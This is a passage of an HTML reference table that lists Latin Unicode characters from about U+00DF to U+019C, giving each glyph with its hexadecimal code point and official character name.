<td style="text-align:center">LATIN SMALL LETTER SHARP S</td>
</tr>
<tr>
<td style="text-align:center">à</td>
<td style="text-align:center">00E0</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">á</td>
<td style="text-align:center">00E1</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">â</td>
<td style="text-align:center">00E2</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ã</td>
<td style="text-align:center">00E3</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH TILDE</td>
</tr>
<tr>
<td style="text-align:center">ä</td>
<td style="text-align:center">00E4</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">å</td>
<td style="text-align:center">00E5</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH RING ABOVE</td>
</tr>
<tr>
<td style="text-align:center">æ</td>
<td style="text-align:center">00E6</td>
<td style="text-align:center">LATIN SMALL LETTER AE</td>
</tr>
<tr>
<td style="text-align:center">ç</td>
<td style="text-align:center">00E7</td>
<td style="text-align:center">LATIN SMALL LETTER C WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">è</td>
<td style="text-align:center">00E8</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">é</td>
<td style="text-align:center">00E9</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ê</td>
<td style="text-align:center">00EA</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ë</td>
<td style="text-align:center">00EB</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ì</td>
<td style="text-align:center">00EC</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">í</td>
<td style="text-align:center">00ED</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">î</td>
<td style="text-align:center">00EE</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ï</td>
<td style="text-align:center">00EF</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ð</td>
<td style="text-align:center">00F0</td>
<td style="text-align:center">LATIN SMALL LETTER ETH</td>
</tr>
<tr>
<td style="text-align:center">ñ</td>
<td style="text-align:center">00F1</td>
<td style="text-align:center">LATIN SMALL LETTER N WITH TILDE</td>
</tr>
<tr>
<td style="text-align:center">ò</td>
<td style="text-align:center">00F2</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ó</td>
<td style="text-align:center">00F3</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ô</td>
<td style="text-align:center">00F4</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">õ</td>
<td style="text-align:center">00F5</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH TILDE</td>
</tr>
<tr>
<td style="text-align:center">ö</td>
<td style="text-align:center">00F6</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">÷</td>
<td style="text-align:center">00F7</td>
<td style="text-align:center">DIVISION SIGN</td>
</tr>
<tr>
<td style="text-align:center">ø</td>
<td style="text-align:center">00F8</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ù</td>
<td style="text-align:center">00F9</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH GRAVE</td>
</tr>
<tr>
<td style="text-align:center">ú</td>
<td style="text-align:center">00FA</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">û</td>
<td style="text-align:center">00FB</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ü</td>
<td style="text-align:center">00FC</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">ý</td>
<td style="text-align:center">00FD</td>
<td style="text-align:center">LATIN SMALL LETTER Y WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">þ</td>
<td style="text-align:center">00FE</td>
<td style="text-align:center">LATIN SMALL LETTER THORN</td>
</tr>
<tr>
<td style="text-align:center">ÿ</td>
<td style="text-align:center">00FF</td>
<td style="text-align:center">LATIN SMALL LETTER Y WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ā</td>
<td style="text-align:center">0100</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">ā</td>
<td style="text-align:center">0101</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ă</td>
<td style="text-align:center">0102</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">ă</td>
<td style="text-align:center">0103</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ą</td>
<td style="text-align:center">0104</td>
<td style="text-align:center">LATIN CAPITAL LETTER A WITH OGONEK</td>
</tr>
<tr>
<td style="text-align:center">ą</td>
<td style="text-align:center">0105</td>
<td style="text-align:center">LATIN SMALL LETTER A WITH OGONEK</td>
</tr>
<tr>
<td style="text-align:center">Ć</td>
<td style="text-align:center">0106</td>
<td style="text-align:center">LATIN CAPITAL LETTER C WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ć</td>
<td style="text-align:center">0107</td>
<td style="text-align:center">LATIN SMALL LETTER C WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ĉ</td>
<td style="text-align:center">0108</td>
<td style="text-align:center">LATIN CAPITAL LETTER C WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ĉ</td>
<td style="text-align:center">0109</td>
<td style="text-align:center">LATIN SMALL LETTER C WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ċ</td>
<td style="text-align:center">010A</td>
<td style="text-align:center">LATIN CAPITAL LETTER C WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ċ</td>
<td style="text-align:center">010B</td>
<td style="text-align:center">LATIN SMALL LETTER C WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">Č</td>
<td style="text-align:center">010C</td>
<td style="text-align:center">LATIN CAPITAL LETTER C WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">č</td>
<td style="text-align:center">010D</td>
<td style="text-align:center">LATIN SMALL LETTER C WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ď</td>
<td style="text-align:center">010E</td>
<td style="text-align:center">LATIN CAPITAL LETTER D WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ď</td>
<td style="text-align:center">010F</td>
<td style="text-align:center">LATIN SMALL LETTER D WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Đ</td>
<td style="text-align:center">0110</td>
<td style="text-align:center">LATIN CAPITAL LETTER D WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">đ</td>
<td style="text-align:center">0111</td>
<td style="text-align:center">LATIN SMALL LETTER D WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ē</td>
<td style="text-align:center">0112</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">ē</td>
<td style="text-align:center">0113</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ĕ</td>
<td style="text-align:center">0114</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">ĕ</td>
<td style="text-align:center">0115</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ė</td>
<td style="text-align:center">0116</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ė</td>
<td style="text-align:center">0117</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">Ę</td>
<td style="text-align:center">0118</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH OGONEK</td>
</tr>
<tr>
<td style="text-align:center">ę</td>
<td style="text-align:center">0119</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH OGONEK</td>
</tr>
<tr>
<td style="text-align:center">Ě</td>
<td style="text-align:center">011A</td>
<td style="text-align:center">LATIN CAPITAL LETTER E WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ě</td>
<td style="text-align:center">011B</td>
<td style="text-align:center">LATIN SMALL LETTER E WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ĝ</td>
<td style="text-align:center">011C</td>
<td style="text-align:center">LATIN CAPITAL LETTER G WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ĝ</td>
<td style="text-align:center">011D</td>
<td style="text-align:center">LATIN SMALL LETTER G WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ğ</td>
<td style="text-align:center">011E</td>
<td style="text-align:center">LATIN CAPITAL LETTER G WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">ğ</td>
<td style="text-align:center">011F</td>
<td style="text-align:center">LATIN SMALL LETTER G WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ġ</td>
<td style="text-align:center">0120</td>
<td style="text-align:center">LATIN CAPITAL LETTER G WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ġ</td>
<td style="text-align:center">0121</td>
<td style="text-align:center">LATIN SMALL LETTER G WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">Ģ</td>
<td style="text-align:center">0122</td>
<td style="text-align:center">LATIN CAPITAL LETTER G WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">ģ</td>
<td style="text-align:center">0123</td>
<td style="text-align:center">LATIN SMALL LETTER G WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">Ĥ</td>
<td style="text-align:center">0124</td>
<td style="text-align:center">LATIN CAPITAL LETTER H WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ĥ</td>
<td style="text-align:center">0125</td>
<td style="text-align:center">LATIN SMALL LETTER H WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ħ</td>
<td style="text-align:center">0126</td>
<td style="text-align:center">LATIN CAPITAL LETTER H WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ħ</td>
<td style="text-align:center">0127</td>
<td style="text-align:center">LATIN SMALL LETTER H WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ĩ</td>
<td style="text-align:center">0128</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH TILDE</td>
</tr>
<tr>
<td style="text-align:center">ĩ</td>
<td style="text-align:center">0129</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH TILDE</td>
</tr>
<tr>
<td style="text-align:center">Ī</td>
<td style="text-align:center">012A</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">ī</td>
<td style="text-align:center">012B</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ĭ</td>
<td style="text-align:center">012C</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">ĭ</td>
<td style="text-align:center">012D</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">Į</td>
<td style="text-align:center">012E</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH OGONEK</td>
</tr>
<tr>
<td style="text-align:center">į</td>
<td style="text-align:center">012F</td>
<td style="text-align:center">LATIN SMALL LETTER I WITH OGONEK</td>
</tr>
<tr>
<td style="text-align:center">İ</td>
<td style="text-align:center">0130</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ı</td>
<td style="text-align:center">0131</td>
<td style="text-align:center">LATIN SMALL LETTER DOTLESS I</td>
</tr>
<tr>
<td style="text-align:center">Ĳ</td>
<td style="text-align:center">0132</td>
<td style="text-align:center">LATIN CAPITAL LIGATURE IJ</td>
</tr>
<tr>
<td style="text-align:center">ĳ</td>
<td style="text-align:center">0133</td>
<td style="text-align:center">LATIN SMALL LIGATURE IJ</td>
</tr>
<tr>
<td style="text-align:center">Ĵ</td>
<td style="text-align:center">0134</td>
<td style="text-align:center">LATIN CAPITAL LETTER J WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ĵ</td>
<td style="text-align:center">0135</td>
<td style="text-align:center">LATIN SMALL LETTER J WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ķ</td>
<td style="text-align:center">0136</td>
<td style="text-align:center">LATIN CAPITAL LETTER K WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">ķ</td>
<td style="text-align:center">0137</td>
<td style="text-align:center">LATIN SMALL LETTER K WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">ĸ</td>
<td style="text-align:center">0138</td>
<td style="text-align:center">LATIN SMALL LETTER KRA</td>
</tr>
<tr>
<td style="text-align:center">Ĺ</td>
<td style="text-align:center">0139</td>
<td style="text-align:center">LATIN CAPITAL LETTER L WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ĺ</td>
<td style="text-align:center">013A</td>
<td style="text-align:center">LATIN SMALL LETTER L WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ļ</td>
<td style="text-align:center">013B</td>
<td style="text-align:center">LATIN CAPITAL LETTER L WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">ļ</td>
<td style="text-align:center">013C</td>
<td style="text-align:center">LATIN SMALL LETTER L WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">Ľ</td>
<td style="text-align:center">013D</td>
<td style="text-align:center">LATIN CAPITAL LETTER L WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ľ</td>
<td style="text-align:center">013E</td>
<td style="text-align:center">LATIN SMALL LETTER L WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ŀ</td>
<td style="text-align:center">013F</td>
<td style="text-align:center">LATIN CAPITAL LETTER L WITH MIDDLE DOT</td>
</tr>
<tr>
<td style="text-align:center">ŀ</td>
<td style="text-align:center">0140</td>
<td style="text-align:center">LATIN SMALL LETTER L WITH MIDDLE DOT</td>
</tr>
<tr>
<td style="text-align:center">Ł</td>
<td style="text-align:center">0141</td>
<td style="text-align:center">LATIN CAPITAL LETTER L WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ł</td>
<td style="text-align:center">0142</td>
<td style="text-align:center">LATIN SMALL LETTER L WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ń</td>
<td style="text-align:center">0143</td>
<td style="text-align:center">LATIN CAPITAL LETTER N WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ń</td>
<td style="text-align:center">0144</td>
<td style="text-align:center">LATIN SMALL LETTER N WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ņ</td>
<td style="text-align:center">0145</td>
<td style="text-align:center">LATIN CAPITAL LETTER N WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">ņ</td>
<td style="text-align:center">0146</td>
<td style="text-align:center">LATIN SMALL LETTER N WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">Ň</td>
<td style="text-align:center">0147</td>
<td style="text-align:center">LATIN CAPITAL LETTER N WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ň</td>
<td style="text-align:center">0148</td>
<td style="text-align:center">LATIN SMALL LETTER N WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ŉ</td>
<td style="text-align:center">0149</td>
<td style="text-align:center">LATIN SMALL LETTER N PRECEDED BY APOSTROPHE</td>
</tr>
<tr>
<td style="text-align:center">Ŋ</td>
<td style="text-align:center">014A</td>
<td style="text-align:center">LATIN CAPITAL LETTER ENG</td>
</tr>
<tr>
<td style="text-align:center">ŋ</td>
<td style="text-align:center">014B</td>
<td style="text-align:center">LATIN SMALL LETTER ENG</td>
</tr>
<tr>
<td style="text-align:center">Ō</td>
<td style="text-align:center">014C</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">ō</td>
<td style="text-align:center">014D</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ŏ</td>
<td style="text-align:center">014E</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">ŏ</td>
<td style="text-align:center">014F</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ő</td>
<td style="text-align:center">0150</td>
<td style="text-align:center">LATIN CAPITAL LETTER O WITH DOUBLE ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ő</td>
<td style="text-align:center">0151</td>
<td style="text-align:center">LATIN SMALL LETTER O WITH DOUBLE ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Œ</td>
<td style="text-align:center">0152</td>
<td style="text-align:center">LATIN CAPITAL LIGATURE OE</td>
</tr>
<tr>
<td style="text-align:center">œ</td>
<td style="text-align:center">0153</td>
<td style="text-align:center">LATIN SMALL LIGATURE OE</td>
</tr>
<tr>
<td style="text-align:center">Ŕ</td>
<td style="text-align:center">0154</td>
<td style="text-align:center">LATIN CAPITAL LETTER R WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ŕ</td>
<td style="text-align:center">0155</td>
<td style="text-align:center">LATIN SMALL LETTER R WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ŗ</td>
<td style="text-align:center">0156</td>
<td style="text-align:center">LATIN CAPITAL LETTER R WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">ŗ</td>
<td style="text-align:center">0157</td>
<td style="text-align:center">LATIN SMALL LETTER R WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">Ř</td>
<td style="text-align:center">0158</td>
<td style="text-align:center">LATIN CAPITAL LETTER R WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ř</td>
<td style="text-align:center">0159</td>
<td style="text-align:center">LATIN SMALL LETTER R WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ś</td>
<td style="text-align:center">015A</td>
<td style="text-align:center">LATIN CAPITAL LETTER S WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ś</td>
<td style="text-align:center">015B</td>
<td style="text-align:center">LATIN SMALL LETTER S WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ŝ</td>
<td style="text-align:center">015C</td>
<td style="text-align:center">LATIN CAPITAL LETTER S WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ŝ</td>
<td style="text-align:center">015D</td>
<td style="text-align:center">LATIN SMALL LETTER S WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ş</td>
<td style="text-align:center">015E</td>
<td style="text-align:center">LATIN CAPITAL LETTER S WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">ş</td>
<td style="text-align:center">015F</td>
<td style="text-align:center">LATIN SMALL LETTER S WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">Š</td>
<td style="text-align:center">0160</td>
<td style="text-align:center">LATIN CAPITAL LETTER S WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">š</td>
<td style="text-align:center">0161</td>
<td style="text-align:center">LATIN SMALL LETTER S WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ţ</td>
<td style="text-align:center">0162</td>
<td style="text-align:center">LATIN CAPITAL LETTER T WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">ţ</td>
<td style="text-align:center">0163</td>
<td style="text-align:center">LATIN SMALL LETTER T WITH CEDILLA</td>
</tr>
<tr>
<td style="text-align:center">Ť</td>
<td style="text-align:center">0164</td>
<td style="text-align:center">LATIN CAPITAL LETTER T WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ť</td>
<td style="text-align:center">0165</td>
<td style="text-align:center">LATIN SMALL LETTER T WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">Ŧ</td>
<td style="text-align:center">0166</td>
<td style="text-align:center">LATIN CAPITAL LETTER T WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">ŧ</td>
<td style="text-align:center">0167</td>
<td style="text-align:center">LATIN SMALL LETTER T WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ũ</td>
<td style="text-align:center">0168</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH TILDE</td>
</tr>
<tr>
<td style="text-align:center">ũ</td>
<td style="text-align:center">0169</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH TILDE</td>
</tr>
<tr>
<td style="text-align:center">Ū</td>
<td style="text-align:center">016A</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">ū</td>
<td style="text-align:center">016B</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH MACRON</td>
</tr>
<tr>
<td style="text-align:center">Ŭ</td>
<td style="text-align:center">016C</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">ŭ</td>
<td style="text-align:center">016D</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH BREVE</td>
</tr>
<tr>
<td style="text-align:center">Ů</td>
<td style="text-align:center">016E</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH RING ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ů</td>
<td style="text-align:center">016F</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH RING ABOVE</td>
</tr>
<tr>
<td style="text-align:center">Ű</td>
<td style="text-align:center">0170</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH DOUBLE ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ű</td>
<td style="text-align:center">0171</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH DOUBLE ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ų</td>
<td style="text-align:center">0172</td>
<td style="text-align:center">LATIN CAPITAL LETTER U WITH OGONEK</td>
</tr>
<tr>
<td style="text-align:center">ų</td>
<td style="text-align:center">0173</td>
<td style="text-align:center">LATIN SMALL LETTER U WITH OGONEK</td>
</tr>
<tr>
<td style="text-align:center">Ŵ</td>
<td style="text-align:center">0174</td>
<td style="text-align:center">LATIN CAPITAL LETTER W WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ŵ</td>
<td style="text-align:center">0175</td>
<td style="text-align:center">LATIN SMALL LETTER W WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ŷ</td>
<td style="text-align:center">0176</td>
<td style="text-align:center">LATIN CAPITAL LETTER Y WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">ŷ</td>
<td style="text-align:center">0177</td>
<td style="text-align:center">LATIN SMALL LETTER Y WITH CIRCUMFLEX</td>
</tr>
<tr>
<td style="text-align:center">Ÿ</td>
<td style="text-align:center">0178</td>
<td style="text-align:center">LATIN CAPITAL LETTER Y WITH DIAERESIS</td>
</tr>
<tr>
<td style="text-align:center">Ź</td>
<td style="text-align:center">0179</td>
<td style="text-align:center">LATIN CAPITAL LETTER Z WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">ź</td>
<td style="text-align:center">017A</td>
<td style="text-align:center">LATIN SMALL LETTER Z WITH ACUTE</td>
</tr>
<tr>
<td style="text-align:center">Ż</td>
<td style="text-align:center">017B</td>
<td style="text-align:center">LATIN CAPITAL LETTER Z WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">ż</td>
<td style="text-align:center">017C</td>
<td style="text-align:center">LATIN SMALL LETTER Z WITH DOT ABOVE</td>
</tr>
<tr>
<td style="text-align:center">Ž</td>
<td style="text-align:center">017D</td>
<td style="text-align:center">LATIN CAPITAL LETTER Z WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ž</td>
<td style="text-align:center">017E</td>
<td style="text-align:center">LATIN SMALL LETTER Z WITH CARON</td>
</tr>
<tr>
<td style="text-align:center">ſ</td>
<td style="text-align:center">017F</td>
<td style="text-align:center">LATIN SMALL LETTER LONG S</td>
</tr>
<tr>
<td style="text-align:center">ƀ</td>
<td style="text-align:center">0180</td>
<td style="text-align:center">LATIN SMALL LETTER B WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ɓ</td>
<td style="text-align:center">0181</td>
<td style="text-align:center">LATIN CAPITAL LETTER B WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ƃ</td>
<td style="text-align:center">0182</td>
<td style="text-align:center">LATIN CAPITAL LETTER B WITH TOPBAR</td>
</tr>
<tr>
<td style="text-align:center">ƃ</td>
<td style="text-align:center">0183</td>
<td style="text-align:center">LATIN SMALL LETTER B WITH TOPBAR</td>
</tr>
<tr>
<td style="text-align:center">Ƅ</td>
<td style="text-align:center">0184</td>
<td style="text-align:center">LATIN CAPITAL LETTER TONE SIX</td>
</tr>
<tr>
<td style="text-align:center">ƅ</td>
<td style="text-align:center">0185</td>
<td style="text-align:center">LATIN SMALL LETTER TONE SIX</td>
</tr>
<tr>
<td style="text-align:center">Ɔ</td>
<td style="text-align:center">0186</td>
<td style="text-align:center">LATIN CAPITAL LETTER OPEN O</td>
</tr>
<tr>
<td style="text-align:center">Ƈ</td>
<td style="text-align:center">0187</td>
<td style="text-align:center">LATIN CAPITAL LETTER C WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ƈ</td>
<td style="text-align:center">0188</td>
<td style="text-align:center">LATIN SMALL LETTER C WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ɖ</td>
<td style="text-align:center">0189</td>
<td style="text-align:center">LATIN CAPITAL LETTER AFRICAN D</td>
</tr>
<tr>
<td style="text-align:center">Ɗ</td>
<td style="text-align:center">018A</td>
<td style="text-align:center">LATIN CAPITAL LETTER D WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ƌ</td>
<td style="text-align:center">018B</td>
<td style="text-align:center">LATIN CAPITAL LETTER D WITH TOPBAR</td>
</tr>
<tr>
<td style="text-align:center">ƌ</td>
<td style="text-align:center">018C</td>
<td style="text-align:center">LATIN SMALL LETTER D WITH TOPBAR</td>
</tr>
<tr>
<td style="text-align:center">ƍ</td>
<td style="text-align:center">018D</td>
<td style="text-align:center">LATIN SMALL LETTER TURNED DELTA</td>
</tr>
<tr>
<td style="text-align:center">Ǝ</td>
<td style="text-align:center">018E</td>
<td style="text-align:center">LATIN CAPITAL LETTER REVERSED E</td>
</tr>
<tr>
<td style="text-align:center">Ə</td>
<td style="text-align:center">018F</td>
<td style="text-align:center">LATIN CAPITAL LETTER SCHWA</td>
</tr>
<tr>
<td style="text-align:center">Ɛ</td>
<td style="text-align:center">0190</td>
<td style="text-align:center">LATIN CAPITAL LETTER OPEN E</td>
</tr>
<tr>
<td style="text-align:center">Ƒ</td>
<td style="text-align:center">0191</td>
<td style="text-align:center">LATIN CAPITAL LETTER F WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ƒ</td>
<td style="text-align:center">0192</td>
<td style="text-align:center">LATIN SMALL LETTER F WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ɠ</td>
<td style="text-align:center">0193</td>
<td style="text-align:center">LATIN CAPITAL LETTER G WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">Ɣ</td>
<td style="text-align:center">0194</td>
<td style="text-align:center">LATIN CAPITAL LETTER GAMMA</td>
</tr>
<tr>
<td style="text-align:center">ƕ</td>
<td style="text-align:center">0195</td>
<td style="text-align:center">LATIN SMALL LETTER HV</td>
</tr>
<tr>
<td style="text-align:center">Ɩ</td>
<td style="text-align:center">0196</td>
<td style="text-align:center">LATIN CAPITAL LETTER IOTA</td>
</tr>
<tr>
<td style="text-align:center">Ɨ</td>
<td style="text-align:center">0197</td>
<td style="text-align:center">LATIN CAPITAL LETTER I WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ƙ</td>
<td style="text-align:center">0198</td>
<td style="text-align:center">LATIN CAPITAL LETTER K WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ƙ</td>
<td style="text-align:center">0199</td>
<td style="text-align:center">LATIN SMALL LETTER K WITH HOOK</td>
</tr>
<tr>
<td style="text-align:center">ƚ</td>
<td style="text-align:center">019A</td>
<td style="text-align:center">LATIN SMALL LETTER L WITH BAR</td>
</tr>
<tr>
<td style="text-align:center">ƛ</td>
<td style="text-align:center">019B</td>
<td style="text-align:center">LATIN SMALL LETTER LAMBDA WITH STROKE</td>
</tr>
<tr>
<td style="text-align:center">Ɯ</td>
<td style="text-align:center">019C</td>
